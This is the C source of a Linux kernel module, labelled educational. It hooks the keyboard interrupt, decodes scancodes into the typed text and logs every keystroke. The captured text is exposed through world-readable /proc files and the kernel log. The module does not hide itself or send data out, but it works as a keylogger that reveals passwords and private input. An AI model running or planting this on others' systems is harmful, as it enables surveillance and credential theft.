#include <asm/io.h> // для inb()
#include <linux/interrupt.h> // request_irq, free_irq, irqreturn_t.
#include <linux/jiffies.h> // метки времени
#include <linux/kfifo.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/workqueue.h>

#include "edu_kbd_monitor.h"

static void kb_work_fn(struct work_struct *work);

static DEFINE_KFIFO(raw_fifo, u8, RAW_FIFO_SIZE); // очередь из cырых байтов
static DEFINE_SPINLOCK(raw_fifo_lock); 
static DEFINE_MUTEX(event_ring_lock);
static DECLARE_WORK(kbd_work, kb_work_fn);

static struct kbd_event event_ring[RING_BUFF_SIZE];
static size_t event_head;
static size_t event_count;
static int dev_id;
static struct proc_dir_entry *proc_entry;
static char typed_text[TEXT_BUFFER_SIZE];
static size_t typed_text_len;
static bool shift_pressed;
static struct proc_dir_entry *proc_text_entry;

static const char *key_name_from_scancode(u8 scancode) {
    u8 base_code = scancode & 0x7F; // отбрасываем 0x80, чтобы мапилось в 1 имя

    if (set_key_names[base_code] != NULL) {
        return set_key_names[base_code];
    }

    return "UNKNOWN";
}

static bool scancode_to_char(u8 scancode, bool shifted, char *out_char) {
    u8 code = scancode & 0x7F;

    switch (code) {
        case 0x02: *out_char = shifted ? '!' : '1'; return true;
        case 0x03: *out_char = shifted ? '@' : '2'; return true;
        case 0x04: *out_char = shifted ? '#' : '3'; return true;
        case 0x05: *out_char = shifted ? '$' : '4'; return true;
        case 0x06: *out_char = shifted ? '%' : '5'; return true;
        case 0x07: *out_char = shifted ? '^' : '6'; return true;
        case 0x08: *out_char = shifted ? '&' : '7'; return true;
        case 0x09: *out_char = shifted ? '*' : '8'; return true;
        case 0x0A: *out_char = shifted ? '(' : '9'; return true;
        case 0x0B: *out_char = shifted ? ')' : '0'; return true;
        case 0x0C: *out_char = shifted ? '_' : '-'; return true;
        case 0x0D: *out_char = shifted ? '+' : '='; return true;
        case 0x1A: *out_char = shifted ? '{' : '['; return true;
        case 0x1B: *out_char = shifted ? '}' : ']'; return true;
        case 0x27: *out_char = shifted ? ':' : ';'; return true;
        case 0x28: *out_char = shifted ? '"' : '\''; return true;
        case 0x29: *out_char = shifted ? '~' : '`'; return true;
        case 0x2B: *out_char = shifted ? '|' : '\\'; return true;
        case 0x33: *out_char = shifted ? '<' : ','; return true;
        case 0x34: *out_char = shifted ? '>' : '.'; return true;
        case 0x35: *out_char = shifted ? '?' : '/'; return true;
        case 0x10: *out_char = shifted ? 'Q' : 'q'; return true;
        case 0x11: *out_char = shifted ? 'W' : 'w'; return true;
        case 0x12: *out_char = shifted ? 'E' : 'e'; return true;
        case 0x13: *out_char = shifted ? 'R' : 'r'; return true;
        case 0x14: *out_char = shifted ? 'T' : 't'; return true;
        case 0x15: *out_char = shifted ? 'Y' : 'y'; return true;
        case 0x16: *out_char = shifted ? 'U' : 'u'; return true;
        case 0x17: *out_char = shifted ? 'I' : 'i'; return true;
        case 0x18: *out_char = shifted ? 'O' : 'o'; return true;
        case 0x19: *out_char = shifted ? 'P' : 'p'; return true;
        case 0x1E: *out_char = shifted ? 'A' : 'a'; return true;
        case 0x1F: *out_char = shifted ? 'S' : 's'; return true;
        case 0x20: *out_char = shifted ? 'D' : 'd'; return true;
        case 0x21: *out_char = shifted ? 'F' : 'f'; return true;
        case 0x22: *out_char = shifted ? 'G' : 'g'; return true;
        case 0x23: *out_char = shifted ? 'H' : 'h'; return true;
        case 0x24: *out_char = shifted ? 'J' : 'j'; return true;
        case 0x25: *out_char = shifted ? 'K' : 'k'; return true;
        case 0x26: *out_char = shifted ? 'L' : 'l'; return true;
        case 0x2C: *out_char = shifted ? 'Z' : 'z'; return true;
        case 0x2D: *out_char = shifted ? 'X' : 'x'; return true;
        case 0x2E: *out_char = shifted ? 'C' : 'c'; return true;
        case 0x2F: *out_char = shifted ? 'V' : 'v'; return true;
        case 0x30: *out_char = shifted ? 'B' : 'b'; return true;
        case 0x31: *out_char = shifted ? 'N' : 'n'; return true;
        case 0x32: *out_char = shifted ? 'M' : 'm'; return true;
        default: return false;
    }
}

static void append_typed_char(char c) {
    if (typed_text_len + 1 >= TEXT_BUFFER_SIZE) {
        return;
    }

    typed_text[typed_text_len++] = c;
    typed_text[typed_text_len] = '\0';
}

static void typed_text_update(u8 scancode) {
    bool is_press = !(scancode & 0x80);
    u8 code = scancode & 0x7F;

    if (code == 0x2A || code == 0x36) {
        shift_pressed = is_press;
        return;
    }

    if (!is_press) {
        return;
    }

    if (code == 0x0E) {
        if (typed_text_len > 0) {
            --typed_text_len;
            typed_text[typed_text_len] = '\0';
        }
        return;
    }

    if (code == 0x1C) {
        append_typed_char('\n');
        return;
    }

    if (code == 0x39) {
        append_typed_char(' ');
        return;
    }

    if (code == 0x0F) {
        append_typed_char('\t');
        return;
    }

    char out_char;
    if (scancode_to_char(scancode, shift_pressed, &out_char)) {
        append_typed_char(out_char);
    }
}

// записываем событие в ринг буффер
static void event_ring_push(u8 scancode) {
    mutex_lock(&event_ring_lock);

    struct kbd_event *event = &event_ring[event_head];
    const char *key_name = key_name_from_scancode(scancode);

    event->scancode = scancode;
    event->is_press = !(scancode & 0x80);
    event->jiffies_ts = jiffies;
    strscpy(event->key_name, key_name, sizeof(event->key_name));
    typed_text_update(scancode);

    event_head = (event_head + 1) % RING_BUFF_SIZE;
    if (event_count < RING_BUFF_SIZE) {
        ++event_count;
    }

    mutex_unlock(&event_ring_lock);
}

static void kb_work_fn(struct work_struct *work) {
    u8 scancode;

    while (kfifo_out_spinlocked(&raw_fifo, &scancode, 1, &raw_fifo_lock) == 1) {
        event_ring_push(scancode);
        pr_info("edu_kbd_monitor: %s key=%s scan=0x%02x\n", (scancode & 0x80) ? "release" : "press",
                key_name_from_scancode(scancode), scancode);
    }
}

static irqreturn_t kb_irq(int irq, void *dev) {
    u8 scancode = inb(KBD_DATA_PORT);

    if (!kfifo_is_full(&raw_fifo)) {
        kfifo_in_spinlocked(&raw_fifo, &scancode, 1, &raw_fifo_lock);
    }

    schedule_work(&kbd_work);
    return IRQ_HANDLED;
}

static ssize_t kb_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
    char *buf = kmalloc(PROC_BUFFER_SIZE, GFP_KERNEL);
    if (buf == NULL) {
        return -ENOMEM;
    }

    struct kbd_event *snapshot = kmalloc_array(RING_BUFF_SIZE, sizeof(*snapshot), GFP_KERNEL);

    if (snapshot == NULL) {
        kfree(buf);
        return -ENOMEM;
    }

    mutex_lock(&event_ring_lock);

    size_t snapshot_count = event_count;
    size_t oldest_idx = (event_head + RING_BUFF_SIZE - event_count) % RING_BUFF_SIZE;
    for (size_t idx = 0; idx < snapshot_count; ++idx) {
        snapshot[idx] = event_ring[(oldest_idx + idx) % RING_BUFF_SIZE];
    }

    mutex_unlock(&event_ring_lock);

    size_t len = 0;
    for (size_t idx = 0; idx < snapshot_count && len < PROC_BUFFER_SIZE; ++idx) {
        len += scnprintf(buf + len, PROC_BUFFER_SIZE - len, "%s 0x%02x %s\n",
                         snapshot[idx].is_press ? "P" : "R", snapshot[idx].scancode,
                         snapshot[idx].key_name);
    }

    ssize_t ret = simple_read_from_buffer(ubuf, count, ppos, buf, len);
    kfree(snapshot);
    kfree(buf);
    return ret;
}

static ssize_t kb_text_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
    (void)file;
    char *buf = kmalloc(TEXT_BUFFER_SIZE + 2, GFP_KERNEL);
    if (buf == NULL) {
        return -ENOMEM;
    }

    mutex_lock(&event_ring_lock);
    size_t len = typed_text_len;
    memcpy(buf, typed_text, typed_text_len);
    mutex_unlock(&event_ring_lock);

    if (len == 0 || buf[len - 1] != '\n') {
        buf[len++] = '\n';
    }
    buf[len] = '\0';

    ssize_t ret = simple_read_from_buffer(ubuf, count, ppos, buf, len);
    kfree(buf);
    return ret;
}

static const struct proc_ops kb_proc_ops = {
    .proc_read = kb_proc_read,
};

static const struct proc_ops kb_text_proc_ops = {
    .proc_read = kb_text_proc_read,
};

static int __init kb_init(void) {
    proc_entry = proc_create("edu_kbd_monitor", 0444, NULL, &kb_proc_ops);
    if (proc_entry == NULL) {
        pr_err("edu_kbd_monitor: failed to create /proc entry\n");
        return -ENOMEM;
    }

    proc_text_entry = proc_create("edu_kbd_text", 0444, NULL, &kb_text_proc_ops);
    if (proc_text_entry == NULL) {
        pr_err("edu_kbd_monitor: failed to create /proc/edu_kbd_text\n");
        remove_proc_entry("edu_kbd_monitor", NULL);
        return -ENOMEM;
    }

    int ret = request_irq(KBD_IRQ, kb_irq, IRQF_SHARED, "edu_kbd_monitor", &dev_id);
    if (ret) {
        pr_err("edu_kbd_monitor: request_irq failed: %d\n", ret);
        remove_proc_entry("edu_kbd_text", NULL);
        remove_proc_entry("edu_kbd_monitor", NULL);
        return ret;
    }

    pr_info("edu_kbd_monitor: loaded on IRQ%d\n", KBD_IRQ);
    return 0;
}

static void __exit kb_exit(void) {
    free_irq(KBD_IRQ, &dev_id);
    cancel_work_sync(&kbd_work);
    remove_proc_entry("edu_kbd_text", NULL);
    remove_proc_entry("edu_kbd_monitor", NULL);
    pr_info("edu_kbd_monitor: unloaded\n");
}

module_init(kb_init);
module_exit(kb_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("droid55");
MODULE_DESCRIPTION("keyboard monitor");
